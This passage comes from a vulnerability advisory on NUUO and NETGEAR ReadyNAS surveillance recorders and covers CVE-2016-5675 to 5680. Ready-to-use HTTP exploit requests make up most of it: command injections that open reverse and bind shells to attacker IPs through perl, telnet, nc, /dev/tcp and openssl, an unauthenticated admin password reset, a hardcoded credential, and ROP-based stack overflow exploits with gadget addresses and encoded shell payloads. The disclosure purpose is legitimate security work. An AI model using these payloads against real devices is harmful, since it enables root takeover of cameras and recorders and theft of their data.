GET /__debugging_center_utils___.php?log=something%3bperl+-MIO%3a%3aSocket+-e+'$p%3dfork%3bexit,if($p)%3b$c%3dnew+IO%3a%3aSocket%3a%3aINET(PeerAddr,""192.168.1.204%3a9000"")%3bSTDIN->fdopen($c,r)%3b$~->fdopen($c,w)%3bsystem$_+while<>%3b'
This will connect a shell back to 192.168.1.204 on port 9000, running as the ""admin"" user.
- NVRmini 2 and NVRsolo:
GET /__debugging_center_utils___.php?log=something%3btelnet+192.168.1.204+9999+|+bash+|+telnet+192.168.1.204+9998
This will connect two shells to 192.168.1.204, one on port 9999 and another on port 9998. To execute commands, echo into the 9999 shell, and receive the output on the 9998 shell. Commands will run as the root user.
Vulnerability: Improper Input Validation (leading to remote code execution)
CVE-2016-5675
Attack Vector: Remote
Constraints: Requires an administrator account
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected)
- NUUO NVRsolo, firmware v1.0.0 to 3.0.0
- NUUO Crystal, firmware v2.2.1 to v3.2.0 (older firmware versions might be affected)
- ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected)
- Other NUUO products that share the same web interface might be affected
The handle_daylightsaving.php page does not sanitise input from the NTPServer parameter correctly and passes it to a PHP system() command (code snippet below):
else if ($act == 'update')
$cmd = sprintf(""/usr/bin/ntpdate %s"", $_GET['NTPServer']);
$find_str = ""time server"";
$sys_msg = system($cmd);
$pos = strpos($sys_msg, $find_str);
The file can only be accessed by an authenticted user.
- ReadyNAS Surveillance:
GET /handle_daylightsaving.php?act=update&NTPServer=bla%3b+whoami+>+/tmp/test
This will create a /tmp/test file with the contents of ""admin"" (current user).
- NVRmini 2 and NVRsolo:
GET /handle_daylightsaving.php?act=update&NTPServer=bla%3brm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.1.204+9000+>/tmp/f
Connects a shell to 192.168.1.204, port 9000, running as root.
- Crystal:
GET /handle_daylightsaving.php?act=update&NTPServer=bla%3bbash+-i+>%26+/dev/tcp/192.168.1.204/4444+0>%26
Connects a shell to 192.168.1.204, port 4444, running as root.
Vulnerability: Administrator password reset
CVE-2016-5676
Attack Vector: Remote
Constraints: None, can be exploited by an unauthenticated attacker
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.5 to unknown (latest version v3.0.0 requires authentication)
- NUUO NVRsolo, firmware v1.7.5 to unknown (latest version v3.0.0 requires authentication)
- ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected)
- Other NUUO products that share the same web interface might be affected
On older versions of the firmware and in the ReadyNAS Surveillance application unauthenticated users can call the cgi_system binary from the web interface. This binary performs a number of sensitive system commands, such as the loading of the default configuration that resets the administrator password. It seems that at least versions 2.2.1 and 3.0.0 of the NVRmini 2 and NVRsolo firmware are not affected, so this vulnerability was fixed either on these or earlier versions, but ReadyNAS Surveillance is still vulnerable.
Proof of concept:
GET /cgi-bin/cgi_system?cmd=loaddefconfig
This will reset the admin password of the web interface to admin or password (depending on the firmware version) on all affected devices.
Vulnerability: Information disclosure (system processes, available memory and filesystem status)
CVE-2016-5677
Attack Vector: Remote
Constraints: None, can be exploited by an unauthenticated attacker
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected)
- NUUO NVRsolo, firmware v1.0.0 to 3.0.0
- ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected)
- Other NUUO products that share the same web interface might be affected
The web interface contains a hidden page (__nvr_status___.php) with a hardcoded username and password that lists the current system processes, available memory and filesystem status. This information can be obtained by an unauthenticated user by performing the following request:
POST /__nvr_status___.php HTTP/1.1
username=nuuoeng&password=qwe23622260&submit=Submit
Vulnerability: Harcoded root password
CVE-2016-5678
Affected products / versions:
- NUUO NVRmini 2, firmware v1.0.0 to 3.0.0
- NUUO NVRsolo, firmware v1.0.0 to 3.0.0
The NVRmini 2 and NVRsolo contain two hardcoded root passwords (one is commented). These passwords have not been cracked, but they are present in the firmware images which are deployed to all NVRmini 2 / NVRsolo devices.

Vulnerability: Command injection in cgi_main transfer license command
CVE-2016-5679
Attack Vector: Local / Remote
Constraints: Requires an administrator account if exploited remotely; can be exploited locally by any logged in user
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.6 to 3.0.0 (older firmware versions might be affected)
- ReadyNAS Surveillance, v1.1.2 (x86 and older versions might be affected)
The transfer_license command has a command injection vulnerability in the ""sn"" parameter:
cgi_main?cmd=transfer_license&method=offline&sn="";<command>;#
Sample exploit for NVRmini2 (open bind shell on port 4444):
GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=""%3bnc+-l+-p+4444+-e+/bin/sh+%26+%23
NETGEAR Surveillance doesn't have netcat, but we can get an openssl reverse shell to 192.168.133.204:4444 instead:
GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=""%3bmkfifo+/tmp/s%3b+/bin/bash+-i+<+/tmp/s+2>%261+|+openssl+s_client+-quiet+-connect+192.168.133.204%3a4444+>+/tmp/s%3b+rm+/tmp/s%3b%23
> Local exploitation:
This vulnerability can be exploited locally by a logged in user to escalate privileges to root on the NVRmini2 and admin on the ReadyNAS with the following command:
CGI_DEBUG=qwe23622260 cgi_main transfer_license 'method=offline&sn=<PAYLOAD>'
The cgi_main binary is located at ""/apps/surveillance/bin/cgi_main"" on the ReadyNAS and ""/NUUO/bin/cgi_main"" on the NVRmini2.
Vulnerability: Stack buffer overflow in cgi_main transfer license command
CVE-2016-5680
Attack Vector: Local / Remote
Constraints: Requires an administrator account if exploited remotely; can be exploited locally by any logged in user
- NUUO NVRmini 2, firmware v1.7.6 to 3.0.0 (older firmware versions might be affected)
- ReadyNAS Surveillance, v1.1.2 (x86 and older versions might be affected)
The ""sn"" parameter in transfer_license cgi_main method not only has a command injection vulnerability, but also a stack buffer overflow. Below is the pseudocode of the affected function - as it can be seen in the sprintf line, the ""sn"" parameter is copied directly into a string with a fixed length of 128 characters.
Function 0x20BC9C (NVRmini2 firmware v3.0.0):
method = getval(""method"");
sn = getval(""sn"");
memset(&command, 0, 128);
sprintf(&command, ""logger -p local0.info -t 'system' \""Activate license: %s\"""", sn);
system(&command);
> For example if the following request is performed:
GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

> Exploit mitigations and constraints
The table below shows the exploit mitigation technologies for each target:
NVRmini2   ReadyNAS
NX          Y          Y
RELRO    Partial    Partial
ASLR        N          Y
An additional constraint to keep in mind is that there can be no null bytes in the exploit as the vulnerability is in the sprintf copy operation (which uses a null byte as the string terminator).
> Exploitation in the NVRmini2 (firmware v3.0.0):
This example exploit creates a root bind shell on port 4444 using ROP gadgets to bypass NX. The gadgets were taken from libc-2.15.so, which is always loaded at 4066c000 in firmware 3.0.0.
0x00018ba0 : pop {r3, lr} ; bx lr -> located at 40684BA0 (first gadget, sets up r3 for the next gadget)
0x000f17cc : mov r0, sp ; blx r3 -> located at 4075D7CC (second gadget, set up args for system)
0x00039ffc : system() -> located at 406A5FFC (takes the argument from r0 - pointing to sp - and executes it)
Payload (in the stack) -> %6e%63%20%2d%6c%20%2d%70%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%73%68%20%26 (""nc -l -p 4444 -e /bin/sh &"")

Other firmware versions will have different gadget addresses. On version 3.0.0 it should work without any modification.
> Exploitation on ReadyNAS Surveillance (version v1.1.2):
To develop this example exploit libcrypto.so.0.9.8 was used. The library is loaded at B6xxx000, where xxx are 4096 possible values for the memory address, as the ReadyNAS has a weak form of ASLR. For this exploit, B6CCE000 was chosen as the target base address (this was chosen randomly from a sample of collected base addresses).
The exploit connects a reverse shell to 192.168.133.204:4444 using OpenSSL. The following ROP gadgets were used:
0x000b3d9c : mov r1, sp ; mov r2, ip ; blx r6 -> located at B6D81D9C (first gadget, gets the location of the stack pointer sp, where the shellcode is located, in r1)
0x00008690 : movs r0, r1 ; movs r0, r0 ; movs r2, r2 ; movs r2, r1 ; bx r7 -> located at B6CD6691 as this is a THUMB mode gadget (second gadget, sets up the arguments to system(), putting them into r0)
0xb6ef91bc: fixed system() address when B6CCE000 is chosen as the base address of libcrypto.so.0.9.8 (takes the argument from r0 - pointing to sp - and executes it)
Payload: (in the stack) -> %6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%73%3b%20%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3c%20%2f%74%6d%70%2f%73%20%32%3e%26%31%20%7c%20%6f%70%65%6e%73%73%6c%20%73%5f%63%6c%69%65%6e%74%20%2d%71%75%69%65%74%20%2d%63%6f%6e%6e%65%63%74%20%31%39%32%2e%31%36%38%2e%31%33%33%2e%32%30%34%3a%34%34%34%34%20%3e%20%2f%74%6d%70%2f%73%3b%20%72%6d%20%2f%74%6d%70%2f%73%20%26 (""mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.133.204:4444 > /tmp/s; rm /tmp/s &"")

Note that due to the ASLR in the ReadyNAS his exploit has be attempted at few times in order for it to work. Usually less than 20 tries is enough to get the reverse shell to connect back.
> Local exploitation:
This vulnerability can be exploited locally by a logged in user to escalate privileges to root on the NVRmini2 and admin on the ReadyNAS with the following command:
CGI_DEBUG=qwe23622260 cgi_main transfer_license 'method=offline&sn=<PAYLOAD>'
The cgi_main binary is located at ""/apps/surveillance/bin/cgi_main"" on the ReadyNAS and ""/NUUO/bin/cgi_main"" on the NVRmini2.
It is likely that all other vulnerabilities in this advisory are exploitable by a local attacker, however this has only been tested for the stack buffer overflow.
>> Fix:
NETGEAR and Nuuo did not respond to CERT/CC coordination efforts (see Timeline below), so no fix is available.
Do not expose any of these devices to the Internet or any networks with unstrusted hosts.
Timeline:
28.02.2016: Disclosure to CERT/CC.
27.04.2016: Requested status update from CERT - they did not receive any response from vendors.
06.06.2016: Requested status update from CERT - still no response from vendors.
Contacted Nuuo and NETGEAR directly. NETGEAR responded with their ""Responsible Disclosure Guidelines"", to which I did not agree and requested them to contact CERT if they want to know the details about the vulnerabilities found. No response from Nuuo.
13.06.2016: CERT sent an update saying that NETGEAR has received the details of the vulnerabilities, and they are attempting to contact Nuuo via alternative channels.
07.07.2016: CERT sent an update saying that they have not received any follow up from both Nuuo and NETGEAR, and that they are getting ready for disclosure.
17.07.2016: Sent an email to NETGEAR and Nuuo warning them that disclosure is imminent if CERT doesn't receive a response or status update. No response received.
01.08.2016: Sent an email to NETGEAR and Nuuo warning them that disclosure is imminent if CERT doesn't receive a response or status update. No response received.
